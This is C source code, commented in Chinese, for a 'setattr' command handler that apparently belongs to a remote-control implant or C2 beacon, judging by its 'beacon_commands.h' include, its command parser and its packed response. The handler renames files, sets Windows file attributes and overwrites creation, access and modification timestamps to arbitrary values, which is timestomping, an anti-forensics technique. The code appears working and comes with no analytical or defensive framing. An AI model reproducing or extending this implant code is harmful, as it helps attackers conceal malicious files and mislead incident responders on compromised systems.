#include "beacon_commands.h"

/* 构建包含给定消息的错误响应 ByteBuf */
static ByteBuf AttrError(const CHAR* text)
{
    ByteBuf out;
    BbInit(&out);
    BbPrintf(&out, "error: %s", text ? text : "setattr failed");
    return out;
}

/* 构建附加 Win32 错误码的错误响应 ByteBuf */
static ByteBuf AttrWinError(const CHAR* prefix)
{
    ByteBuf out;
    BbInit(&out);
    BbPrintf(&out, "error: %s: %lu", prefix, (ULONG)GetLastError());
    return out;
}

/* 通过替换给定路径中的文件名部分来构造同级路径 */
static WCHAR* AttrSiblingPath(const WCHAR* path, const WCHAR* new_name)
{
    const WCHAR* slash1;
    const WCHAR* slash2;
    const WCHAR* slash;
    SIZE_T dir_len;
    SIZE_T name_len;
    WCHAR* out;

    /* 查找最后一个路径分隔符（反斜杠或正斜杠） */
    slash1 = wcsrchr(path, L'\\');
    slash2 = wcsrchr(path, L'/');
    slash = slash1 > slash2 ? slash1 : slash2;
    if (!slash) {
        return HeapStrDupW(new_name);
    }

    dir_len = (SIZE_T)(slash - path) + 1u;
    name_len = wcslen(new_name);
    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(dir_len + name_len + 1u) * sizeof(WCHAR));
    if (!out) {
        return NULL;
    }
    wcsncpy_s(out, dir_len + name_len + 1u, path, dir_len);
    wcscpy_s(out + dir_len, name_len + 1u, new_name);
    return out;
}

/* 将 Unix 时间戳（自纪元以来的秒数）转换为 Windows FILETIME */
static FILETIME AttrUnixToFiletime(INT64 unix_time)
{
    ULARGE_INTEGER v;
    FILETIME ft;
    INT64 seconds = unix_time + 11644473600ll;

    /* 若为负值则限制为纪元起始时间 */
    if (seconds < 0) {
        seconds = 0;
    }
    v.QuadPart = (UINT64)seconds * 10000000ull;
    ft.dwLowDateTime = v.LowPart;
    ft.dwHighDateTime = v.HighPart;
    return ft;
}

/* 在平台层面应用文件属性和时间戳 */
static INT AttrApplyPlatform(const WCHAR* path, UINT32 flag, INT64 ctime,
                             UINT32 win_attrs, INT64 mtime, INT64 atime)
{
    HANDLE file;
    FILETIME ct;
    FILETIME at;
    FILETIME wt;

    /* 若请求则应用 Windows 文件属性 */
    if (flag & 16u) {
        if (!SetFileAttributesW(path, win_attrs)) {
            return 0;
        }
    }

    /* 若未设置时间戳标志则跳过时间戳操作 */
    if ((flag & (2u | 4u | 8u)) == 0) {
        return 1;
    }

    /* 以备份语义打开文件以允许修改时间戳 */
    file = CreateFileW(path,
                       FILE_WRITE_ATTRIBUTES | FILE_READ_ATTRIBUTES,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       NULL,
                       OPEN_EXISTING,
                       FILE_FLAG_BACKUP_SEMANTICS,
                       NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!GetFileTime(file, &ct, &at, &wt)) {
        CloseHandle(file);
        return 0;
    }

    /* 根据标志更新各个时间戳 */
    if (flag & 8u) {
        ct = AttrUnixToFiletime(ctime);
    }
    if (flag & 4u) {
        at = AttrUnixToFiletime(atime);
    }
    if (flag & 2u) {
        wt = AttrUnixToFiletime(mtime);
    }

    if (!SetFileTime(file, &ct, &at, &wt)) {
        CloseHandle(file);
        return 0;
    }

    CloseHandle(file);
    return 1;
}

/* 处理 setattr 命令：重命名、设置时间戳和设置文件属性 */
ByteBuf CommandSetattr(Parser* p)
{
    UINT32 arg_count = ParserU32(p);
    CHAR* target_utf8 = NULL;
    WCHAR* target = NULL;
    WCHAR* actual = NULL;
    CHAR* new_name_utf8 = NULL;
    WCHAR* new_name = NULL;
    UINT32 flag;
    UINT32 win_attrs = 0;
    INT64 mtime = 0;
    INT64 atime = 0;
    INT64 ctime = 0;
    ByteBuf result;

    /* 验证最小参数数量 */
    if (arg_count < 2) {
        return AttrError("setattr requires at least destination and flag");
    }

    /* 解析目标路径和操作标志 */
    target_utf8 = ParserString(p);
    flag = ParserU32(p);

    /* 根据标志位掩码解析可选字段 */
    if (flag & 1u) {
        new_name_utf8 = ParserString(p);
    }
    if (flag & 2u) {
        mtime = (INT64)ParserU64(p);
    }
    if (flag & 4u) {
        atime = (INT64)ParserU64(p);
    }
    if (flag & 8u) {
        ctime = (INT64)ParserU64(p);
    }
    if (flag & 16u) {
        win_attrs = ParserU32(p);
    }
    if (flag & 32u) {
        (VOID)ParserU32(p);
    }

    /* 检查解析器错误 */
    if (p->error[0]) {
        ByteBuf err;
        BbInit(&err);
        BbPrintf(&err, "error: %s", p->error);
        HeapFree(GetProcessHeap(), 0, (target_utf8));
        HeapFree(GetProcessHeap(), 0, (new_name_utf8));
        return err;
    }

    /* 将目标转换为宽字符串 */
    target = Utf8ToWide(target_utf8);
    actual = target ? HeapStrDupW(target) : NULL;
    if (!target || !actual) {
        HeapFree(GetProcessHeap(), 0, (target_utf8));
        HeapFree(GetProcessHeap(), 0, (new_name_utf8));
        HeapFree(GetProcessHeap(), 0, (target));
        HeapFree(GetProcessHeap(), 0, (actual));
        return AttrError("allocation failed");
    }

    /* 若请求则执行重命名 */
    if ((flag & 1u) && new_name_utf8 && new_name_utf8[0]) {
        WCHAR* renamed;
        new_name = Utf8ToWide(new_name_utf8);
        renamed = new_name ? AttrSiblingPath(target, new_name) : NULL;
        if (!renamed) {
            HeapFree(GetProcessHeap(), 0, (target_utf8));
            HeapFree(GetProcessHeap(), 0, (new_name_utf8));
            HeapFree(GetProcessHeap(), 0, (target));
            HeapFree(GetProcessHeap(), 0, (actual));
            HeapFree(GetProcessHeap(), 0, (new_name));
            return AttrError("allocation failed");
        }
        if (!MoveFileExW(target, renamed, 0)) {
            HeapFree(GetProcessHeap(), 0, (target_utf8));
            HeapFree(GetProcessHeap(), 0, (new_name_utf8));
            HeapFree(GetProcessHeap(), 0, (target));
            HeapFree(GetProcessHeap(), 0, (actual));
            HeapFree(GetProcessHeap(), 0, (new_name));
            HeapFree(GetProcessHeap(), 0, (renamed));
            return AttrWinError("rename failed");
        }
        HeapFree(GetProcessHeap(), 0, (actual));
        actual = renamed;
    }

    /* 应用平台级别的属性和时间戳 */
    if (!AttrApplyPlatform(actual, flag, ctime, win_attrs, mtime, atime)) {
        HeapFree(GetProcessHeap(), 0, (target_utf8));
        HeapFree(GetProcessHeap(), 0, (new_name_utf8));
        HeapFree(GetProcessHeap(), 0, (target));
        HeapFree(GetProcessHeap(), 0, (actual));
        HeapFree(GetProcessHeap(), 0, (new_name));
        return AttrWinError("apply attributes failed");
    }

    /* 构建成功响应 */
    {
        CHAR* actual_utf8 = WideToUtf8(actual);
        ByteBuf text;
        BbInit(&text);
        BbPrintf(&text, "Successfully updated attributes for: %s", actual_utf8 ? actual_utf8 : "");
        result = PacketPackTextArray((const CHAR*)text.data);
        BbFree(&text);
        HeapFree(GetProcessHeap(), 0, (actual_utf8));
    }

    HeapFree(GetProcessHeap(), 0, (target_utf8));
    HeapFree(GetProcessHeap(), 0, (new_name_utf8));
    HeapFree(GetProcessHeap(), 0, (target));
    HeapFree(GetProcessHeap(), 0, (actual));
    HeapFree(GetProcessHeap(), 0, (new_name));
    return result;
}
